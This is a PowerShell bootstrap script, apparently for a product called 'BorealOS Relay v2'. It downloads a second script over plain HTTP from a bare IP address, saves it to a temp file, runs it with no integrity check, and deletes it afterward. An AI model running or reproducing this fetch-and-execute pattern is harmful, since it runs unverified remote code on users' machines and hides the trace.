# BorealOS Relay v2 - Bootstrap (ASCII only, fixes encoding)
# This script is pure ASCII to avoid any encoding issues itself.
# It downloads download.ps1 as raw bytes, decodes as UTF-8, and runs it.

# Force UTF-8 for console I/O
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
[Console]::InputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8

# Download as raw bytes (avoids WebClient guessing wrong charset)
$wc = New-Object System.Net.WebClient
$bytes = $wc.DownloadData("http://8.148.237.155:3003/download.ps1")

# Decode bytes as UTF-8
$scriptText = [System.Text.Encoding]::UTF8.GetString($bytes)

# Write to temp file with UTF-8 BOM (PowerShell 5.x respects BOM)
$tempFile = Join-Path $env:TEMP "borealos_download.ps1"
$utf8WithBom = New-Object System.Text.UTF8Encoding $true
[System.IO.File]::WriteAllText($tempFile, $scriptText, $utf8WithBom)

# Execute
& $tempFile

# Cleanup
Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
